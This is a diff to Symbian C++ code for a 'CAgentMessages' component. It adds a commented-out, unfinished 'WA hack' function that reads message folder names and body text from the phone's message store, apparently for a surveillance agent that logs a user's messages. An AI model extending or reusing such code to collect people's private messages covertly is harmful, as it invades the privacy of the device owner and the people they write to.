@@ -970,6 +970,7 @@ void CAgentMessages::DoOneRoundL()
 	TMsvId service;
 	TMsvEntry msvEntryIdx;
 	TInt res = iMsvSession->GetEntry(msvId, service, msvEntryIdx);
+	
 	/*
 	if(res == KErrNone)  //TODO: delete when done with test
 		{
@@ -1048,7 +1049,12 @@ void CAgentMessages::DoOneRoundL()
 				CleanupStack::PopAndDestroy(&buf);
 			}
 		}
-		
+		/*
+		else // TODO: delete when done with whatsapp
+			{
+			GetWAMessageBufferL(msvEntryIdx,msvId);
+			}
+		*/
 	}
 	
 	iArrayIndex++;
@@ -1366,6 +1372,49 @@ void CAgentMessages::WriteMailFile(const TDesC8& aData)
 }
 */
 
+//TODO: delete when done with WA hack
+/*
+void CAgentMessages::GetWAMessageBufferL(TMsvEntry& aMsvEntryIdx, const TMsvId& aMsvId)
+{
+
+		
+			
+	// set date in filetime format
+	TTime date = aMsvEntryIdx.iDate;
+			
+	// insert folder name
+	TMsvId service;
+	TMsvId parentMsvId = aMsvEntryIdx.Parent();
+	TMsvEntry parentEntry;
+	TInt res = iMsvSession->GetEntry(parentMsvId, service, parentEntry);
+	TUint8* ptrData = (TUint8 *)parentEntry.iDetails.Ptr();
+	
+	// insert body
+	// this code retrieves body larger than 256 characters:
+	// http://discussion.forum.nokia.com/forum/showthread.php?146721-how-to-get-FULL-message-body-for-SMS/page2&highlight=mime+body
+	CMsvEntry* cEntry = iMsvSession->GetEntryL(aMsvId);
+	CleanupStack::PushL(cEntry);
+	if (cEntry->HasStoreL())
+		{
+		CMsvStore *store = cEntry->ReadStoreL();
+		CleanupStack::PushL(store);
+			
+		if (store->HasBodyTextL())
+			{
+			CParaFormatLayer* paraLayer = CParaFormatLayer::NewL();
+			CCharFormatLayer* charLayer = CCharFormatLayer::NewL();
+			CRichText* richtext = CRichText::NewL(paraLayer,charLayer);
+			store->RestoreBodyTextL(*richtext);
+			TBuf<128> plainText;
+			plainText.Copy(richtext->Read(0,128));
+			TInt a=1;
+			}
+		CleanupStack::PopAndDestroy(store);
+		}
+	CleanupStack::PopAndDestroy(cEntry);
+		
+}
+*/
 /*
  * PER LA CREAZIONE DEL LOG:
  * 
